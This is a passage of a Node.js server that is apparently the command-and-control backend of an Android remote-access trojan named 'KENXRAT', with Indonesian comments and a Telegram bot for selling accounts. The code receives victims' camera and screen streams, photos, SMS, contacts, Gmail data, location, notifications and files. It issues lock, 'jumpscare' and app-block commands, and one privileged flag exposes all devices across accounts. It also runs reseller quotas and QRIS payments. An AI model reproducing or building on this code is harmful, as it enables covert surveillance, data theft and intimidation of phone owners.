    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'jumpscareStart') {
    devices[deviceId].status.jumpscareActive = true
    devices[deviceId].status.jumpscareUrl    = value
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'jumpscareStop') {
    devices[deviceId].status.jumpscareActive = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'blockApp') {
    try {
      const obj = typeof value === 'string' ? JSON.parse(value) : value
      const arr = devices[deviceId].status.blockedApps || []
      if (!arr.includes(obj.package)) arr.push(obj.package)
      devices[deviceId].status.blockedApps = arr
      broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
    } catch (_) {}
  } else if (command === 'unblockApp') {
    const arr = devices[deviceId].status.blockedApps || []
    devices[deviceId].status.blockedApps = arr.filter(p => p !== value)
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'unblockAll') {
    devices[deviceId].status.blockedApps = []
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  }

  io.to(`device:${deviceId}`).emit('command', { command, value })
  res.json({ ok: true })
})

const devices           = {}
const cameraFrames      = {}
const controllerSockets = new Set()

io.on('connection', (socket) => {

  socket.on('controller:join', (data) => {
  const token = data?.token
  if (!token || !sessions[token]) {
    socket.emit('auth:error', { message: 'Unauthorized' })
    socket.disconnect()
    return
  }
  const username = sessions[token].username
  const uid = sessions[token].uid || ''
  socket.data.uid = uid

  const accounts = loadAccounts()
  const acc = accounts[username]
  socket.data.smooth = acc?.smooth || false  // ← tambah ini

  controllerSockets.add(socket.id)

  const devList = acc?.smooth
    ? getDeviceListForSmooth()
    : getDeviceListForUid(uid)

  socket.emit('devices:update', devList)
})

  socket.on('device:register', (data) => {
    const { deviceId, name, battery, charging, sdkVersion, androidVersion, uid } = data
    devices[deviceId] = {
      uid: uid || '',
      id: deviceId,
      name: name || 'Unknown Device',
      socketId: socket.id,
      connectedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      info: { battery: battery ?? -1, charging: charging ?? false, sdkVersion: sdkVersion ?? -1, androidVersion: androidVersion ?? '?' },
      status: { flashlight: false, cameraActive: false, deviceLocked: false, lockTitle: '', jumpscareActive: false, jumpscareUrl: '', blockedApps: [] }
    }
    socket.join(`device:${deviceId}`)
    broadcastToUid(uid || '', 'devices:update', getDeviceListForUid(uid || ''))

    const accounts = loadAccounts()
    const owner = Object.values(accounts).find(a => a.uid === uid)
    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })
    console.log(`\x1b[32m\n╔══════════════════════════════════╗`)
    console.log(`║      NEW DEVICE CONNECTED        ║`)
    console.log(`╚══════════════════════════════════╝\x1b[0m`)
    console.log(`\x1b[36m  Name    :\x1b[0m ${name || 'Unknown'}`)
    console.log(`\x1b[36m  Owner   :\x1b[0m ${owner ? owner.displayName : 'Unknown'}`)
    console.log(`\x1b[36m  Battery :\x1b[0m ${battery ?? '?'}% ${charging ? '(Charging)' : ''}`)
    console.log(`\x1b[36m  Android :\x1b[0m ${androidVersion ?? '?'} (SDK ${sdkVersion ?? '?'})`)
    console.log(`\x1b[36m  ID      :\x1b[0m ${deviceId}`)
    console.log(`\x1b[36m  Time    :\x1b[0m ${time}`)
    console.log(`\x1b[32m──────────────────────────────────\x1b[0m\n`)

    const pingInterval = setInterval(() => {
      if (devices[deviceId] && devices[deviceId].socketId === socket.id) {
        io.to(`device:${deviceId}`).emit('ping:keepalive')
      } else {
        clearInterval(pingInterval)
      }
    }, 25000)

    socket.on('disconnect', () => clearInterval(pingInterval))
  })

  socket.on('device:status', (data) => {
    const { deviceId, status } = data
    if (!devices[deviceId]) return

    if (status.installedApps) {
      broadcastToUid(devices[deviceId].uid, 'apps:list', { deviceId, apps: status.installedApps })
      delete status.installedApps
    }
    if (status.notifList) {
      broadcastToUid(devices[deviceId].uid, 'notif:list', { deviceId, list: status.notifList })
      delete status.notifList
    }
    if (status.smsList) {
      broadcastToUid(devices[deviceId].uid, 'sms:list', { deviceId, list: status.smsList })
      delete status.smsList
    }

    devices[deviceId].status   = { ...devices[deviceId].status, ...status }
    devices[deviceId].lastSeen = new Date().toISOString()
    broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    broadcastToUid(devices[deviceId].uid, `status:${deviceId}`, devices[deviceId].status)
  })

  socket.on('device:notif', (data) => {
    const dev = devices[data.deviceId]
    if (dev) broadcastToUid(dev.uid, 'device:notif', data)
  })

  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data
    cameraFrames[deviceId] = frame
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:frame', { deviceId, frame })
  })

  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame })
  })
  
  
  socket.on('camera:screenshot', (data) => {
    const { deviceId, frame, facing } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:screenshot', { deviceId, frame, facing })
  })

  socket.on('device:gallery', (data) => {
    const { deviceId, photos } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'device:gallery', { deviceId, photos })
  })

  socket.on('device:location', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:location', data)
  })

  socket.on('device:contacts', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:contacts', data)
  })

  socket.on('device:gmail', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:gmail', data)
  })

  socket.on('device:themeChanged', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:themeChanged', data)
  })

  socket.on('device:phone', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:phone', data)
  })

  socket.on('device:files', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:files', data)
  })

  socket.on('device:filedata', (data) => {
    const { reqId, error, base64, mime } = data
    if (!reqId || !pendingFileDownloads[reqId]) return
    if (error) {
      pendingFileDownloads[reqId](error)
    } else {
      const buf = Buffer.from(base64, 'base64')
      pendingFileDownloads[reqId](null, buf, mime || 'application/octet-stream')
    }
  })

  socket.on('disconnect', () => {
    controllerSockets.delete(socket.id)
    const socketUid = socket.data.uid || ''
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        const deviceUid  = devices[id].uid || socketUid
        const deviceName = devices[id].name || 'Unknown'
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })
        console.log(`\x1b[31m\n╔══════════════════════════════════╗`)
        console.log(`║      DEVICE DISCONNECTED         ║`)
        console.log(`╚══════════════════════════════════╝\x1b[0m`)
        console.log(`\x1b[33m  Name    :\x1b[0m ${deviceName}`)
        console.log(`\x1b[33m  ID      :\x1b[0m ${id}`)
        console.log(`\x1b[33m  Time    :\x1b[0m ${time}`)
        console.log(`\x1b[31m──────────────────────────────────\x1b[0m\n`)
        delete cameraFrames[id]
        delete devices[id]
        broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid))
        break
      }
    }
    if (socketUid) broadcastToUid(socketUid, 'devices:update', getDeviceListForUid(socketUid))
  })
})

function broadcastToControllers(event, data, uid) {
  controllerSockets.forEach(sid => {
    const s = io.sockets.sockets.get(sid)
    if (!s) return

    if (s.data.smooth) {
      // Smooth dapat semua event KECUALI devices:update
      // Smooth punya list sendiri via getDeviceListForSmooth
      if (event === 'devices:update') {
        s.emit('devices:update', getDeviceListForSmooth())
      } else {
        s.emit(event, data)
      }
      return
    }

    if (uid && s.data.uid !== uid) return
    s.emit(event, data)
  })
}

function broadcastToUid(uid, event, data) {
  broadcastToControllers(event, data, uid)
}


function getDeviceListForSmooth() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name,
    uid: d.uid,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    info: d.info || {},
    status: d.status
  }))
}

function getDeviceListForUid(uid) {
  if (!uid) return []
  return Object.values(devices)
    .filter(d => d.uid === uid)
    .map(d => ({
      id: d.id, name: d.name,
      connectedAt: d.connectedAt, lastSeen: d.lastSeen,
      info: d.info || {},
      status: d.status
    }))
}

function getDeviceList() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    info: d.info || {},
    status: d.status
  }))
}

bot.onText(/^\/start/, (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  bot.sendMessage(chat, `*KENXRAT — Bot Manajemen Akun*

Perintah Yang Tersedia:

• \`/cakun NamaUser, password\`
  → Buat Akun Baru

• \`/listakun\`
  → Lihat Semua Akun

• \`/delakun username\`
  → Hapus Akun

• \`/addvisa <username> <jumlah>\`
  → Tambah Quota Akun

• \`/delvisa <username> <jumlah>\`
  → Kurangi Quota Akun

• \`/cekvisa <username>\`
  → Cek Quota Akun

_Contoh:_
\`/addvisa kenzie 100\`
\`/delvisa kenzie 50\`
\`/cekvisa kenzie\``, { parse_mode: 'Markdown' })
})


// ── /addvisa <username> [jumlah] ──────────────────────────────
const VISA_DEFAULT = {
  owner:    { reseller: 10, member: 60 },
  reseller: { member: 100 }
}

bot.onText(/^\/addvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parts    = match[1].trim().split(/\s+/)
  const rawUser  = parts[0]
  const jumlahRaw = parts[1] ? parseInt(parts[1]) : null

  if (jumlahRaw !== null && (isNaN(jumlahRaw) || jumlahRaw <= 0))
    return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.')

  const accounts = loadAccounts()

  // Cari exact match dulu, fallback lowercase
  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc     = accounts[key]
  const myRole  = acc.role || 'member'
  const allowed = CAN_CREATE_ROLES[myRole] || []

  if (!allowed.length)
    return bot.sendMessage(chat, `❌ Role "${myRole}" tidak bisa membuat akun, VISA tidak berlaku.`)

  if (!acc.visa) acc.visa = {}

  const lines = allowed.map(targetRole => {
    const defaultAdd = (VISA_DEFAULT[myRole] || {})[targetRole] || 0
    const tambah     = jumlahRaw !== null ? jumlahRaw : defaultAdd
    const before     = (acc.visa[targetRole] || 0)
    acc.visa[targetRole] = before + tambah
    const base  = (ROLE_QUOTA[myRole] || {})[targetRole] || 0
    const total = base + acc.visa[targetRole]
    return `• ${targetRole}: +${tambah} → total ${total}`
  })

  accounts[key] = acc
  saveAccounts(accounts)

  bot.sendMessage(chat, `✅ *VISA Ditambahkan!*\n\n👤 ${acc.displayName || key}\n🎫 Quota Ditambah:\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

// ── /delvisa <username> <jumlah> ──────────────────────────────
bot.onText(/^\/delvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parts    = match[1].trim().split(/\s+/)
  const rawUser  = parts[0]
  const jumlah   = parseInt(parts[1])

  if (!jumlah || jumlah <= 0)
    return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.')

  const accounts = loadAccounts()

  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc     = accounts[key]
  const myRole  = acc.role || 'member'
  const allowed = CAN_CREATE_ROLES[myRole] || []

  if (!acc.visa) acc.visa = {}

  const lines = allowed.map(targetRole => {
    const before = acc.visa[targetRole] || 0
    acc.visa[targetRole] = Math.max(0, before - jumlah)
    const base  = (ROLE_QUOTA[myRole] || {})[targetRole] || 0
    const total = base + acc.visa[targetRole]
    return `• ${targetRole}: -${jumlah} → total ${total}`
  })

  accounts[key] = acc
  saveAccounts(accounts)

  bot.sendMessage(chat, `✅ *VISA Dikurangi!*\n\n👤 ${acc.displayName || key}\n🎫 Quota Sekarang:\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

// ── /cekvisa <username> ────────────────────────────────────────
bot.onText(/^\/cekvisa (.+)/i, (msg, match) => {
  const chat    = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const rawUser  = match[1].trim()
  const accounts = loadAccounts()

  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc    = accounts[key]
  const myRole = acc.role || 'member'

  if (myRole === 'developer') {
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: developer\n♾️ Quota: Unlimited`, { parse_mode: 'Markdown' })
  }

  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!allowed.length)
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n❌ Tidak bisa membuat akun`, { parse_mode: 'Markdown' })

  const lines = allowed.map(targetRole => {
    const base      = (ROLE_QUOTA[myRole] || {})[targetRole] || 0
    const visa      = (acc.visa || {})[targetRole] || 0
    const total     = base + visa
    const used      = getQuotaUsed(key, targetRole)
    const remaining = total - used
    return `• *${targetRole}*: ${used}/${total} (sisa ${remaining})${visa > 0 ? ` [+${visa} visa]` : ''}`
  })

  bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n📊 Quota:\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/cakun (.+)/i, async (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parsed = parseCakun(msg.text)
  if (!parsed) {
    return bot.sendMessage(chat, `⚠️ Format Salah!

Contoh:
\`/cakun kenzie, 123\`
\`/cakun kenzie, password123\``, { parse_mode: 'Markdown' })
  }

  const { username, displayName, password } = parsed
  const accounts = loadAccounts()
  const key      = username.toLowerCase()

  if (accounts[key]) {
    return bot.sendMessage(chat, `❌ Gagal: Akun "${username}" Sudah Ada`)
  }

  const newUid = crypto.randomBytes(16).toString('hex')
  accounts[key] = { password: password, displayName: displayName || username, uid: newUid, createdAt: new Date().toISOString() }
  saveAccounts(accounts)

  bot.sendMessage(chat, `✅ *Akun Berhasil Dibuat!*

👤 Username: \`${displayName}\`
🔐 Password: \`${password}\`
🆔 UID: \`${newUid}\`

_Simpan Baik-Baik Username & Password Ini._`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/listakun$/i, (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const accounts = loadAccounts()
  const list     = Object.entries(accounts).map(([user, data]) => ({ username: user, displayName: data.displayName, uid: data.uid || '-', createdAt: data.createdAt }))

  if (list.length === 0) return bot.sendMessage(chat, '📭 Belum Ada Akun Yang Dibuat.')

  const rows = list.map((acc, i) => {
    const tgl = new Date(acc.createdAt).toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
      year: '2-digit', hour: '2-digit', minute: '2-digit'
    })
    return `${i + 1}. *${acc.displayName}*\n   Login: \`${acc.username}\`\n   UID: \`${acc.uid || '-'}\`\n   Dibuat: ${tgl}`
  }).join('\n\n')

  bot.sendMessage(chat, `👥 *Daftar Akun (${list.length})*\n\n${rows}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/delakun (.+)/i, (msg, match) => {
  const chat     = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const username = match[1].trim().toLowerCase()
  if (!username) {
    return bot.sendMessage(chat, `⚠️ Tulis Username Yang Mau Dihapus.\n\nContoh: \`/delakun omak\``, { parse_mode: 'Markdown' })
  }

  const accounts = loadAccounts()
  if (!accounts[username]) {
    return bot.sendMessage(chat, `❌ Gagal: Akun "${username}" Tidak Ditemukan`)
  }

  delete accounts[username]
  saveAccounts(accounts)

  for (const [tok, user] of Object.entries(sessions)) {
    if (user === username) delete sessions[tok]
  }

  bot.sendMessage(chat, `🗑️ Akun \`${username}\` Berhasil Dihapus. Semua Sesi Aktifnya Juga Dihentikan.`, { parse_mode: 'Markdown' })
})

bot.on('message', (msg) => {
  if (!msg.text || msg.text.startsWith('/')) return
})



// ================================================================
// ===================== HELPER SYSTEM ============================
// ================================================================

const HELPER_PRICE = 5000;
const HELPER_TIMER = 300; // 5 menit
const HELPERS_FILE = path.join(__dirname, 'helpers.json');

function loadHelpers() {
    try {
        return JSON.parse(fs.readFileSync(HELPERS_FILE, 'utf8'));
    } catch {
        return {};
    }
}

function saveHelpers(helpers) {
    fs.writeFileSync(HELPERS_FILE, JSON.stringify(helpers, null, 2));
}

// ── CREATE HELPER ORDER ─────────────────────────────────────────
app.post('/api/helper/create', async (req, res) => {
    const { username, amount } = req.body;

    if (!username || username.length < 3) {
        return res.status(400).json({
            success: false,
            error: 'Username minimal 3 karakter!'
        });
    }

    const accounts = loadAccounts();
    const key = username.toLowerCase();

    if (!accounts[key]) {
        return res.status(404).json({
            success: false,
            error: `Username "${username}" tidak ditemukan di sistem!`
        });
    }

    const orderId = 'HLP-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    try {
        const qris = await createQrisPakasir({
            amount: HELPER_PRICE,
            orderId: orderId
        });

        const helpers = loadHelpers();
        helpers[orderId] = {
            username: username,
            amount: HELPER_PRICE,
            status: 'pending',
            pakasir_order_id: qris.invoice_id || orderId,
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + HELPER_TIMER * 1000).toISOString()
        };
        saveHelpers(helpers);

        console.log(`\x1b[36m[HELPER]\x1b[0m Invoice: ${orderId} | ${username} | Rp ${HELPER_PRICE.toLocaleString('id-ID')}`);

        res.json({
            success: true,
            invoice_id: orderId,
            amount: HELPER_PRICE,
            qr_image: qris.qrString,
            payment_url: `https://app.pakasir.com/pay/${qris.invoice_id || orderId}`,
            expires_in: HELPER_TIMER
        });

    } catch (error) {
        console.error('[HELPER] Error:', error.message);
        res.status(500).json({
            success: false,
            error: `Gagal membuat QRIS: ${error.message}`
        });
    }
});

// ── CHECK HELPER STATUS ────────────────────────────────────────
app.get('/api/helper/status/:invoiceId', async (req, res) => {
    const { invoiceId } = req.params;
    const helpers = loadHelpers();
    const helper = helpers[invoiceId];

    if (!helper) {
        return res.status(404).json({
            status: 'not_found',
            error: 'Invoice tidak ditemukan'
        });
    }

    if (helper.status === 'pending' && new Date(helper.expiresAt) <= new Date()) {
        helper.status = 'expired';
        saveHelpers(helpers);
        return res.json({ status: 'expired', invoice_id: invoiceId });
    }

    try {
        const status = await checkStatusPakasir({
            orderId: helper.pakasir_order_id || invoiceId,
            amount: helper.amount
        });

        if (status.isPaid) {
            helper.status = 'paid';
            helper.paidAt = new Date().toISOString();
            saveHelpers(helpers);
        }

        res.json({
            status: helper.status,
            invoice_id: invoiceId,
            amount: helper.amount,
            username: helper.username
        });

    } catch (error) {
        console.error('[HELPER] Check status error:', error.message);
        res.status(500).json({
            status: 'error',
            error: `Gagal cek status: ${error.message}`
        });
    }
});

// ── COMPLETE HELPER ─────────────────────────────────────────────
app.post('/api/helper/complete', async (req, res) => {
    const { invoice_id, username } = req.body;

    if (!invoice_id || !username) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap'
        });
    }

    const helpers = loadHelpers();
    const helper = helpers[invoice_id];

    if (!helper) {
        return res.status(404).json({
            success: false,
            error: 'Invoice tidak ditemukan'
        });
    }

    if (helper.status !== 'paid') {
        return res.status(400).json({
            success: false,
            error: 'Pembayaran belum dikonfirmasi'
        });
    }

    // ── CLEAR CACHE DI DEVICE.JSON ─────────────────────────────
    const key = username.toLowerCase();
    const devices = loadDevices();
    let clearedCount = 0;

    if (devices[key]) {
        delete devices[key];
        saveDevices(devices);
        clearedCount = 1;
        console.log(`\x1b[33m[HELPER]\x1b[0m Cache di-clear untuk: ${key}`);
    } else {
        for (const [deviceId, deviceData] of Object.entries(devices)) {
            if (deviceData === key || (deviceData && deviceData.username === key)) {
                delete devices[deviceId];
                clearedCount++;
            }
        }
        if (clearedCount > 0) {
            saveDevices(devices);
            console.log(`\x1b[33m[HELPER]\x1b[0m ${clearedCount} device di-clear untuk: ${key}`);
        }
    }

    helper.status = 'completed';
    helper.completedAt = new Date().toISOString();
    helper.clearedCount = clearedCount;
    saveHelpers(helpers);

    console.log(`\x1b[32m[HELPER]\x1b[0m Selesai: ${username} | ${clearedCount} device di-clear`);

    // Notifikasi ke owner
    try {
        await bot.sendMessage(OWNER_ID,
            `🔧 *HELPER COMPLETED*\n\n` +
            `Invoice: ${invoice_id}\n` +
            `Username: ${username}\n` +
            `Cache: ${clearedCount} device di-clear\n` +
            `Harga: Rp ${helper.amount.toLocaleString('id-ID')}`
        );
    } catch (e) {}

    res.json({
        success: true,
        username: username,
        cleared_count: clearedCount
    });
});

// ── GET HELPERS (Admin) ────────────────────────────────────────
app.get('/api/admin/helpers', requireAuth, (req, res) => {
    const myRole = getAccountRole(req.username);
    if (!['developer', 'owner'].includes(myRole)) {
        return res.status(403).json({ error: 'Akses ditolak' });
    }

    const helpers = loadHelpers();
    const list = Object.entries(helpers).map(([id, data]) => ({
        invoice_id: id,
        ...data
    }));

    res.json(list);
});

// ── ROUTE HELPER ────────────────────────────────────────────────
app.get('/helper', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'helper.html'));
});

console.log('🔧 HELPER SYSTEM LOADED');


const PORT = process.env.PORT || 4317
server.listen(PORT, () => {

sendAccountsToBot()
setInterval(sendAccountsToBot, 5 * 60 * 60 * 1000)


  console.log(`Server Online :${PORT}`)
  console.log('Bot Telegram Berjalan...')
})
